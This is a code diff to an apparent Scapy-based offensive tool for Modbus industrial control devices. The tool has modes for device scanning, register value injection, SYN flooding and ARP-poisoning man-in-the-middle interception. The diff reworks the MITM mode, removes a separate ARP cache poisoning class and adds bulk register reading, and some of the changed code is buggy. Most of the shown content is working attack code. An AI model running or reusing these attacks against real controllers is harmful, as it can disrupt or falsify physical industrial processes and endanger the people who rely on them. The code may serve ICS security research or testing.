@@ -26,15 +26,18 @@ verbose = False
 transId = 1
 timeout = 60
 
-#Device Identification Object range
-MINOBJECTID = 1 # Start at 1
-MAXOBJECTID = 256 # Ends at 256
 # Function codes range
-MINCODE = 1  # 0 is illegal
-MAXCODE = 45  # Upper than 127 are exception codes
+MINCODE = 1  # Default : 1 (0 is not valid)
+MAXCODE = 45  # Default : 127 (Upper than 127 are exception codes)
+
 # Registers Address range
 MINADDR = 0
-MAXADDR = 256  # Default : 256
+MAXADDR = 25  # Default : 256
+"""
+Returns the i th bit 
+"""
+def getBit(num, i):
+	return ((num >> i) & 1)
 
 class MBregisters():
 	"""
@@ -52,14 +55,32 @@ class MBregisters():
 	def setCode(self, code):
 		if self.code.count(code) == 0: 
 			self.code.append(code)
+
 	def setCoil(self, addr, value):
-		self.coils[addr] = value
+		self.coils[addr] = bool(value)
+	def setCoils(self, startAddr, quantity, values):
+		for i in range(1, quantity + 1):
+			self.setCoil(startAddr+i-1, getBit(values[(i-1)/16], i%16 - 1))
+
 	def setInDiscrete(self, addr, value):
-		self.inDiscrete[addr] = value
+		self.inDiscrete[addr] = bool(value)
+	def setInDiscretes(self, startAddr, quantity, values):
+		for i in range(1, quantity + 1):
+			self.setInDiscrete(startAddr+i-1, getBit(values[(i-1)/16], i%16 - 1))
+
 	def setHoldReg(self, addr, value):
 		self.holdReg[addr] = value
+	def setHoldRegs(self, startAddr, quantity, values):
+		for i in range(0, quantity):
+			self.setHoldReg(startAddr+i, values[i])
+
 	def setRegIn(self, addr, value):
 		self.regIn[addr] = value
+	def setRegIns(self, startAddr, quantity, values):
+		for i in range(0, quantity):
+			self.setRegIn(startAddr+i, values[i])
+
+
 	def setDevId(self, addr, value):
 		self.devId[addr] = value
 
@@ -67,11 +88,11 @@ class MBregisters():
 	Read Device diagnostic
 	"""
 	def scanDeviceIdent(self):
-		global MINOBJECTID, MAXOBJECTID, verbose, iface
+		global _obj_id_min, _obj_id_max, verbose, iface
 		# Open connection
 		c = connectMb(self.ip)
 		
-		for objId in range(MINOBJECTID, MAXOBJECTID):
+		for objId in range(_obj_id_min, _obj_id_max):
 			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU2B_Read_Device_Identification_Request(readCode=4, objectId=objId)
 			ans = c.sr1(pkt, verbose=False)
 			ans = ModbusADU_Response(str(ans))
@@ -130,9 +151,9 @@ class MBregisters():
 		elif code == 43:
 			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU2B_Read_Device_Identification_Request()		
 		else:
-			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU00_Generic_Request(funcCode=code)
+			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU00_Generic_Request(funcCode=code)
 #FIXME:  Considering the packet forged, we try to put good values and length with the codes known and remove extra payload (seems not working)
-			pkt = ModbusADU_Request(str(pkt))
+#			pkt = ModbusADU_Request(str(pkt))
 		
 		try:	
 			if verbose:
@@ -305,12 +326,10 @@ class SniffMB(threading.Thread):
 
 		if verbose:
 			print("Sniffing...")
-#		try:
-		sniff(prn=self.__reply, filter="port " + str(modport), timeout = self.timer)
-#		except KeyboardInterrupt:
-#			sys.exit(0)
-#		except:
-#			print("[LISTENING] Unexpected error:"), sys.exc_info()[0]
+		try:
+			sniff(prn=self.__reply, filter="port " + str(modport), timeout = self.timer)
+		except:
+			print("[LISTENING] Unexpected error:"), sys.exc_info()[0]
 
 		return
 
@@ -471,15 +490,31 @@ class MITM:
 
 		multiprocessing.Process(target=self.arp_poison).start()
 		try:
-			sniff(filter='((dst %s) and (src %s)) or ( (dst %s) and (src %s))'%(self.target[0], self.victim[0],self.victim[0],self.target[0]),prn=lambda x:self.routep(x), iface=iface)
+			sniff(filter='((dst %s) and (src %s)) or ( (dst %s) and (src %s)) or arp'%(self.target[0], self.victim[0],self.victim[0],self.target[0]),prn=lambda x:self.routep(x), iface=iface)
 		except KeyboardInterrupt as e:
 			pass
-			#wireshark(packets)
 	def routep(self,packet):
 		global iface
 		#Ignore packets from me
 		if packet[Ether].src == self.mymac:
 			return
+
+
+		#Reply to ARP who-is
+#TODO
+#		if packet.haslayer(ARP):
+#			resend = False
+#			if  packet[ARP].op != 1:
+#				return
+#
+#			if packet[Ether].src == self.victim[1] and packet[ARP].pdst == self.target[0]:
+#				resend = True
+#			if packet[Ether].src == self.node2[1] and packet[ARP].pdst == self.victim[0]:
+#				resend = True
+#
+#			if resend == False:
+#				return
+#
 
 		#Prepare packet for forwarding
 		if packet.haslayer(IP):
@@ -500,10 +535,10 @@ class MITM:
 
 		#Assemble Query/Response
 		if packet.haslayer(ModbusADU_Request):
-			index = str(packet[IP].src) + " >> " + str(packet[IP].dst) + " [" + str(packet[ModbusADU_Request].transId) + "]"
+			index = str(packet[IP].src) + " >> " + str(packet[IP].dst) + " [" + str(packet[ModbusADU_Request].transId) + "]" + str(packet.funcCode)
 			self.querys[index] = packet
 		elif packet.haslayer(ModbusADU_Response):
-			index = str(packet[IP].dst) + " >> " + str(packet[IP].src) + " [" + str(packet[ModbusADU_Response].transId) + "]"
+			index = str(packet[IP].dst) + " >> " + str(packet[IP].src) + " [" + str(packet[ModbusADU_Response].transId) + "]" + str(packet.funcCode)
 			
 			#If we do not have the query, we reject the packet
 			if self.querys[index] is None:
@@ -529,7 +564,7 @@ class MITM:
 
 
 
-		sendp(packet, iface=iface)
+		sendp(packet, iface=iface, verbose=False)
 
 	def arp_poison(self):
 		a=ARP(op=2, psrc=self.victim[0], pdst=self.node2[0])
@@ -630,16 +665,16 @@ def fragIdentif(ip):
 """
 Retreive a specific value of a register
 """
-def getValue(c, code, addr):
+def getValue(c, code, addr, quantity=1):
 	
 	if code == 1:
-		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU01_Read_Coils_Request(startAddr=addr)		
+		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU01_Read_Coils_Request(startAddr=addr, quantity=quantity)		
 	elif code == 2:
-		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU02_Read_Discrete_Inputs_Request(startAddr=addr)		
+		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU02_Read_Discrete_Inputs_Request(startAddr=addr, quantity=quantity)	
 	elif code == 3:
-		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU03_Read_Holding_Registers_Request(startAddr=addr)		
+		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU03_Read_Holding_Registers_Request(startAddr=addr, quantity=quantity)
 	elif code == 4:
-		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU04_Read_Input_Registers_Request(startAddr=addr)		
+		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU04_Read_Input_Registers_Request(startAddr=addr, quantity=quantity)
 	else:
 		return None
 	
@@ -657,15 +692,46 @@ def getValue(c, code, addr):
 	else:
 		return None
 	
-
+"""
+Retreive specific value of registers
+"""
+def getValues(c, code, addr, quantity=1):
+	
+	if code == 1:
+		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU01_Read_Coils_Request(startAddr=addr, quantity=quantity)		
+	elif code == 2:
+		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU02_Read_Discrete_Inputs_Request(startAddr=addr, quantity=quantity)	
+	elif code == 3:
+		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU03_Read_Holding_Registers_Request(startAddr=addr, quantity=quantity)
+	elif code == 4:
+		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU04_Read_Input_Registers_Request(startAddr=addr, quantity=quantity)
+	else:
+		return None
+	
+	ans = c.sr1(pkt, verbose=False)
+	ans = ModbusADU_Response(str(ans))
+	
+	if ans.funcCode == 1:
+		return ans[ModbusPDU01_Read_Coils_Response].coilStatus
+	elif ans.funcCode == 2:
+		return ans[ModbusPDU02_Read_Discrete_Inputs_Response].inputStatus
+	elif ans.funcCode == 3:
+		return ans[ModbusPDU03_Read_Holding_Registers_Response].registerVal
+	elif ans.funcCode == 4:
+		return ans[ModbusPDU04_Read_Input_Registers_Response].registerVal
+	else:
+		return None
+	
 """
 Active Device Monitoring
 Input the device for its values
 """
-def activeMonitoring(ip, timeout):
+def activeMonitoring(ip):
 	global verbose
 	refreshDelay = 1 #sleep time
-	
+
+	if verbose:
+		print "Getting all Addresses defined..."	
 	myDevice = MBregisters(ip)
 	for code in [1,2,3,4]:
 		myDevice.checkCodeDefined(code)
@@ -677,93 +743,78 @@ def activeMonitoring(ip, timeout):
 		myDevice.checkHoldRegDefined()
 	if 4 in myDevice.code:
 		myDevice.checkRegInDefined()
-	
-	c = connectMb(ip)
-	
-	while True:
-		for addr in myDevice.coils:
-			myDevice.setCoil(addr, getValue(c, 1, addr))
+		
+	try:
+		c = connectMb(ip)
+		
+		cCoils = compactList(myDevice.coils)
+		cInDiscretes = compactList(myDevice.inDiscrete)
+		cHoldReg = compactList(myDevice.holdReg)
+		cRegIn = compactList(myDevice.regIn)
+
+		while True:
+			for startAddr in cCoils:
+				myDevice.setCoils(startAddr, cCoils[startAddr], getValues(c, 1, startAddr, cCoils[startAddr]))
+				
+			for addr in myDevice.inDiscrete:
+				myDevice.setInDiscretes(startAddr, cInDiscretes[startAddr], getValues(c, 2, startAddr, cInDiscretes[startAddr]))
+
+			for startAddr in cHoldReg:
+				myDevice.setHoldRegs(startAddr,  cHoldReg[startAddr], getValues(c, 3, startAddr, cHoldReg[startAddr]))
+
+			for startAddr in cRegIn:
+				myDevice.setRegIns(startAddr,  cRegIn[startAddr], getValues(c, 4, startAddr, cRegIn[startAddr]))
+
+			myDevice.printMe()
+
+			time.sleep(refreshDelay)
+	except KeyboardInterrupt as e:
+		pass
 			
-		for addr in myDevice.inDiscrete:
-			myDevice.setInDiscrete(addr, getValue(c, 2, addr))
-
-		for addr in myDevice.holdReg:
-			myDevice.setHoldReg(addr, getValue(c, 3, addr))
-
-		for addr in myDevice.regIn:
-			myDevice.setRegIn(addr, getValue(c, 4, addr))
-
-		myDevice.printMe()
-
-		time.sleep(refreshDelay)
-
 	c.close()
+
+"""
+Compact a list of indexes from :
+	{1:xx, 2:xx, 3:xx, 5:xx}
+	To : {1:3, 5:1} (addrStart, quantity)
+"""
+def compactList(oList, maxElements = 2000):
+	cList = {}
+	start = None
+	for addr in sorted(oList):
+		#Entry point
+		if start is None:
+			start = addr
+			cList[start] = 1
+		else:
+			if addr == start + cList[start]:
+				cList[start] += 1
+				if cList[start] == maxElements:
+					start = None
+			else:
+				start = addr
+				cList[start] = 1
+	return cList
 	
 """
 Passive Device Monitoring
 Listen the traffic for the device values
 """
-def passiveMonitoring(ip, timer=20):
-		sniffer = SniffMB(ip, timer)
-		sniffer.start()
+def passiveMonitoring(ip, timer = 20):
+	sniffer = SniffMB(ip, timer)
+	sniffer.start()
 
+	try:
 		while sniffer.is_alive():
 			time.sleep(5)
 			sniffer.myReg.printMe()
 			print "---------------------------------"
+	except KeyboardInterrupt as e:
+		sniffer.join()
+		pass
+	sniffer.myReg.printMe()
 
-		sniffer.myReg.printMe()
-
-
-"""
-Define tool for an ARP Cache poisonning
-"""
-class ARPCachePoisonning(threading.Thread):
-	def __init__(self, clientIP, gatewayIP):
-		threading.Thread.__init__(self)
-		self.clientIP = clientIP
-		self.gatewayIP = gatewayIP
-
-		self.gatewayMAC = getmacbyip(self.gatewayIP)
-		self.clientMAC = getmacbyip(self.clientIP)
-
-	def run(self):
-		self.poison()
-		
-	"""
-	Send a gratuitous spoofed ARP
-	"""
-	def poisonARP(self):
-		send(ARP(op=2, pdst=self.clientIP, psrc=self.gatewayIP, hwdst=self.clientMAC), verbose=False)
-		send(ARP(op=2, pdst=self.gatewayIP, psrc=self.clientIP, hwdst=self.gatewayMAC), verbose=False)
-		
-	def restoreARP(self):
-		send(ARP(op=2, pdst=self.gatewayIP, psrc=self.clientIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.clientMAC), count=3, verbose=False)
-		send(ARP(op=2, pdst=self.clientIP, psrc=self.gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewayMAC), count=3, verbose=False)
-
-	def enableForwarding(self):
-		with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
-			ipf.write('0\n')
-			#ipf.write('1\n')
-	def disableForwarding(self):
-		with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
-			ipf.write('0\n')
-	def poison(self, interval = 10):
-		self.enableForwarding();
-		self.running = True
-		try:
-			while self.running is True:
-				self.poisonARP();
-				time.sleep(interval)
-		except KeyboardInterrupt:
-			pass
-		
-		self.restoreARP();
-		self.disableForwarding();
 	
-	def ends(self):
-		self.running = False
-		
 """
 Launch an ARP poisonning attack
 """
@@ -785,7 +836,7 @@ What to do if the script is call by  CLI and not imported
 if __name__ == "__main__":
 	parser = argparse.ArgumentParser()
 	parser.add_argument("-m", "--mode",
-                        choices=['scanNetwork', 'scanDeviceCode','scanDevice','scanDeviceIdent', 'injectValue', 'interact','ARPPoisonning', 'SYN_flood', 'activeMonitor', 'passiveMonitor', 'injectValue2' ],
+                        choices=['scanNetwork', 'scanDeviceCode','scanDevice','scanDeviceIdent', 'injectValue', 'interact','SYN_flood', 'activeMonitor', 'passiveMonitor', 'MITM' ],
                         help='mode of use :\n'
 							'scanNetwork = Scan ip range to find devices responding on Modbus port,'
 							'scanDeviceCode = Scan function codes defined,'
@@ -832,11 +883,9 @@ if __name__ == "__main__":
 		myDev = MBregisters(args.target)
 		myDev.scanDeviceIdent()
 		myDev.printMe()
-	elif args.mode == "ARPPoisonning":
-		launchARPpoisonning(args.target, args.gateway)
 	elif args.mode == "injectValue":
 		injectValue(args.target)
-	elif args.mode == "injectValue2":
+	elif args.mode == "MITM":
 		mitm = MITM(args.target, args.source, args.gateway)
 	elif args.mode == "SYN_flood":
 		SYN_flood(args.target, args.timeout)
@@ -845,7 +894,7 @@ if __name__ == "__main__":
 	elif args.mode == "interact":
 		interact(mydict=globals())
 	elif args.mode == "activeMonitor":
-		activeMonitoring(args.target, args.timeout)	
+		activeMonitoring(args.target)	
 	elif args.mode == "passiveMonitor":
 		passiveMonitoring(args.target, args.timeout)
 	elif args.mode == "fragIdentif":
